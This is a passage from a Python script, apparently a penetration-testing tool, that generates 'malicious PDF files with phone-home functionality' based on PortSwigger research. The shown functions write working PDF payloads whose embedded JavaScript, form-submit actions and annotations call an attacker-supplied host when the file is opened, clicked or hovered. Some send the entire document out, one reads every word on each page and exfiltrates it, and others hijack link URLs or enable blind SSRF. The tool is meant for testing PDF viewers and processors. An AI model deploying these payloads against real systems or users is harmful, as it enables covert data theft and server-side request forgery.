                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PC << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test20"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pc-close'    ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


# PortSwigger Research: SubmitForm with SubmitPDF flag
# Sends the entire PDF document contents to the attacker server
# Uses Flags 256 (SubmitPDF) instead of Flags 4 (SubmitHTML)
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf21(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'submitpdf'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F (''' + host + '''/test21.pdf) /V true /FS /URL >>
     /Flags 256
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
900
%%EOF
''')


# PortSwigger Research: JavaScript submitForm() API
# Uses this.submitForm() to submit PDF contents via JavaScript
# Submits as PDF format using cSubmitAs parameter - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf22(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      this.submitForm({cURL: "''' + host + '''/test22", cSubmitAs: "PDF"});
      )
      >>
  >>
>>''')


# PortSwigger Research: Button Widget injection for Chrome/PDFium
# Invisible button widget covering entire page executes JavaScript on click
# Requires /AcroForm in catalog and Widget annotation with /FT /Btn
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf23(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-btn'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Btn /T (a) >>
     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test23"), cFS: "CHTTP"})) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
920
%%EOF
''')


# PortSwigger Research: Text Field Widget for blind SSRF
# Widget with text field type submits form data as POST body
# Enables blind SSRF attacks via PDF form field submission
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf24(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-tx'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Tx /T (foo) /V (bar) >>
     /A << /S /JavaScript /JS (this.submitForm("''' + host + '''/test24", false, false, ["foo"])) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
930
%%EOF
''')


# PortSwigger Research: Content extraction via getPageNthWord()
# JavaScript reads all rendered text from the PDF and exfiltrates it
# Loops through all pages and words, sends data via network callback
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf25(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 85 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (SECRET: The quick brown fox jumps) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (var w=[];for(var p=0;p<this.numPages;p++){for(var i=0;i<this.getPageNumWords(p);i++){w.push(this.getPageNthWord(p,i,true))}}app.openDoc({cPath:encodeURI("''' + host + '''/test25?d="+w.join("+")),cFS:"CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
950
%%EOF
''')


# PortSwigger Research: Mouseover trigger via E (mouse enter) entry
# Annotation fires JavaScript on mouseover without requiring a click
# Uses additional action dictionary with E entry - targets PDFium
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf26(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 900 900]
                 /AA << /E << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test26"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'mouseover'   ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000810 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
930
%%EOF
''')


# PortSwigger Research: Hybrid Acrobat/Chrome payload
# Single PDF targets both Acrobat (via OpenAction JavaScript) and Chrome (via Widget button)
# Uses distinct callback paths to identify which viewer triggered
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf27(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [6 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [6 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'hybrid'      ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-acrobat"), cFS: "CHTTP"}))
  >>
endobj

6 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Btn /T (a) >>
     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test27-chrome"), cFS: "CHTTP"})) >>
  >>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000570 00000 n
0000000690 00000 n
0000000870 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1120
%%EOF
''')


# PortSwigger Research: URL hijacking in annotations
# Injection via unescaped parentheses redirects annotation clicks to attacker URL
# Duplicate /A key - second (attacker URI) overrides first (original URI)
# Exploits PDF-Lib and jsPDF which fail to escape parentheses
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf28(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /URI /URI (''' + host + '''/test28) /Type /Action >>
                 /F 0
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri-hijack'  ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000790 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
910
%%EOF
''')


def main():
    """Main function to generate malicious PDFs."""
    parser = argparse.ArgumentParser(
        description="Generate 29 malicious PDF files with phone-home functionality for penetration testing. "
                    "Covers URI actions, JavaScript execution, form submission, annotation injection, "
                    "widget-based XSS, content extraction, and more. "
                    "Use with Burp Collaborator or Interact.sh to detect callbacks."
    )
    parser.add_argument("host", help="Callback URL or IP address (e.g. https://burp-collaborator-url)")
    parser.add_argument("--output-dir", default="output", help="Directory to save generated PDF files (default: output/)")
    args = parser.parse_args()

    host = args.host
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    if not validate_url_or_ip_validators(host):
        print("Error: Invalid URL or IP address. Input must have a scheme (e.g. https://) or be a valid IP address.")
        sys.exit(1)

    print("[+] Creating PDF files..")

    pdf_generators = {
        1: (create_malpdf, f'\\\\{host}\\test'),
        1.1: (create_malpdf, ensure_scheme(host)),
        2: (create_malpdf2, ensure_scheme(host)),
        3: (create_malpdf3, ensure_scheme(host)),
        4: (create_malpdf4, host),
        5: (create_malpdf5, ensure_scheme(host)),
        6: (create_malpdf6, ensure_scheme(host)),
        7: (create_malpdf7, ensure_scheme(host)),
        8: (create_malpdf8, ensure_scheme(host)),
        9: (create_malpdf9, ensure_scheme(host)),
        10: (create_malpdf10, ensure_scheme(host)),
        11: (create_malpdf11, None),
        12: (create_malpdf12, ensure_scheme(host)),
        13: (create_malpdf13, ensure_scheme(host)),
        14: (create_malpdf14, ensure_scheme(host)),
        15: (create_malpdf15, ensure_scheme(host)),
        16: (create_malpdf16, ensure_scheme(host)),
        17: (create_malpdf17, ensure_scheme(host)),
        18: (create_malpdf18, ensure_scheme(host)),
        19: (create_malpdf19, ensure_scheme(host)),
        20: (create_malpdf20, ensure_scheme(host)),
        21: (create_malpdf21, ensure_scheme(host)),
        22: (create_malpdf22, ensure_scheme(host)),
        23: (create_malpdf23, ensure_scheme(host)),
        24: (create_malpdf24, ensure_scheme(host)),
        25: (create_malpdf25, ensure_scheme(host)),
        26: (create_malpdf26, ensure_scheme(host)),
        27: (create_malpdf27, ensure_scheme(host)),
        28: (create_malpdf28, ensure_scheme(host)),
    }

    file_extensions = {14: '.svg'}

    for num, (func, content) in pdf_generators.items():
        ext = file_extensions.get(num, '.pdf')
        if isinstance(num, float):
            name = f"test{int(num)}_{str(num).split('.')[1]}{ext}"
        else:
            name = f"test{num}{ext}"
        filename = output_dir / name
        if content:
            func(filename, content)
        else:
            func(filename)

    print("[-] Done!")

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        raise SystemExit("Use Python 3 (or higher) only")
    main()
